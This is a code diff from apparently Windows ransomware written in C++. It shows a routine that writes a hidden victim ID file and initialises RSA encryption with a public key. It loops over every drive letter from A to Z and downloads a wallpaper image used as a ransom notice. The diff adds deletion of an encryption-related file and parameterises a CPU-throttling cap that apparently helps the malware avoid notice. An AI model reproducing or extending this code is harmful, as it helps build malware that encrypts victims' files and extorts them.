@@ -140,9 +140,6 @@ int encryption_main( bool fromStart) {
 		IDFile.close();
 		makeFileHidden(pathToID);
 	}
-#ifndef DEBUG
-	string path = get_home();
-#endif
 	
 	rsaEncryptor.init_Encryptor(mod, pubKey);
 	for (char i = 'A';i <= 'Z';i++)
@@ -176,7 +173,7 @@ int encryption_main( bool fromStart) {
 	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
 	makeFileHidden(pathToImage);
 	changeHiddenFileState(true);
-
+	remove(pathToENC);
 #if VM
 	changeWallPaper(pathToImage);//TODO move to notify
 #endif
@@ -421,7 +418,7 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
 	cpuInfo.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP |
 		JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
 		JOB_OBJECT_CPU_RATE_CONTROL_NOTIFY;
-	cpuInfo.CpuRate = (5 * 100);
+	cpuInfo.CpuRate = (CPU_CYCLES_PERCENT * 100);
 	//5 is arbitrary, *100 is a way to normalize value based on documentation
 	status = SetInformationJobObject(
 		hJob,
